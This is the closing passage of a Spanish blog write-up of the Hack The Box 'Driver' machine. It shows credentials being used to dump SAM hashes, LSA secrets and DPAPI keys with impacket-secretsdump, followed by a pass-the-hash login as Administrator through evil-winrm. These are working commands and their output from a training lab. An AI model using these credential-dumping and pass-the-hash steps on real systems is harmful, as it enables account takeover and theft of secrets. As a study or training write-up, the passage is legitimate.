SMB         10.129.250.229  445    DRIVER           <span class="o">[</span>+] DRIVER<span class="se">\m</span>iguelito:miguel123 <span class="o">(</span>Pwn3d!<span class="o">)</span>
SMB         10.129.250.229  445    DRIVER           <span class="o">[</span>+] Dumping SAM hashes
SMB         10.129.250.229  445    DRIVER           Administrator:500:aad3b435b51404eeaad3b435b51404ee:d1256cff8b5b5fdb8c327d3b6c3f5017:::
SMB         10.129.250.229  445    DRIVER           Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.250.229  445    DRIVER           DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.250.229  445    DRIVER           tony:1003:aad3b435b51404eeaad3b435b51404ee:dfdb5b520de42ca5d1b84ce61553d085:::
SMB         10.129.250.229  445    DRIVER           miguelito:1004:aad3b435b51404eeaad3b435b51404ee:0ddc9e8df3c8843f75a918df65dda6ee:::
SMB         10.129.250.229  445    DRIVER           <span class="o">[</span>+] Added 5 SAM hashes to the database
</code></pre></div></div>

<ul>
  <li>También lo podemos hacer con <code class="language-plaintext highlighter-rouge">impacket-secretsdump</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-secretsdump <span class="s1">'driver.htb/miguelito:miguel123@10.129.250.229'</span>
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Service RemoteRegistry is <span class="k">in </span>stopped state
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Service RemoteRegistry is disabled, enabling it
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Starting service RemoteRegistry
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Target system bootKey: 0xe5b3cda034afd685bc69ccd3c4e9387c
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Dumping <span class="nb">local </span>SAM hashes <span class="o">(</span>uid:rid:lmhash:nthash<span class="o">)</span>
Administrator:500:aad3b435b51404eeaad3b435b51404ee:d1256cff8b5b5fdb8c327d3b6c3f5017:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
tony:1003:aad3b435b51404eeaad3b435b51404ee:dfdb5b520de42ca5d1b84ce61553d085:::
miguelito:1004:aad3b435b51404eeaad3b435b51404ee:0ddc9e8df3c8843f75a918df65dda6ee:::
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Dumping cached domain logon information <span class="o">(</span>domain/username:hash<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Dumping LSA Secrets
<span class="o">[</span><span class="k">*</span><span class="o">]</span> DefaultPassword
DRIVER<span class="se">\t</span>ony:liltony
<span class="o">[</span><span class="k">*</span><span class="o">]</span> DPAPI_SYSTEM
dpapi_machinekey:0x68d8efd1bd3fa3ab206268f0bbc6e2a4a5e4b43e
dpapi_userkey:0x68060403e8f0276a683ad704b45dc7b850d9722f
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Cleaning up...
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Stopping service RemoteRegistry
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Restoring the disabled state <span class="k">for </span>service RemoteRegistry
</code></pre></div></div>

<ul>
  <li>Ahora aplicamos <code class="language-plaintext highlighter-rouge">passathehash</code> y nos conectamos como el usuario <code class="language-plaintext highlighter-rouge">Administrator</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content evil-winrm <span class="nt">-i</span> 10.129.250.229 <span class="nt">-u</span> Administrator <span class="nt">-H</span> d1256cff8b5b5fdb8c327d3b6c3f5017

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
</span>driver<span class="se">\a</span>dministrator
</code></pre></div></div>

  </div><a class="u-url" href="/hackthebox/machines/easy/2024/04/07/driver.html" hidden></a>
</article>

      </div>
    </main><footer class="site-footer h-card">
  <data class="u-url" href="/"></data>

  <div class="wrapper">

    <div class="footer-col-wrapper">
      <div class="footer-col">
        <p class="feed-subscribe">
          <a href="http://localhost:4000/feed.xml">
            <svg class="svg-icon orange">
              <use xlink:href="/assets/minima-social-icons.svg#rss"></use>
            </svg><span>Subscribe</span>
          </a>
        </p>
        <ul class="contact-list">
          <li class="p-name">MiguelRega7</li>
          
        </ul>
      </div>
      <div class="footer-col">
        <p>Posts sobre resolucion de CTFs y ciberseguridad.
</p>
      </div>
    </div>

    <div class="social-links"><ul class="social-media-list"></ul>
</div>

  </div>

</footer>
</body>

</html>
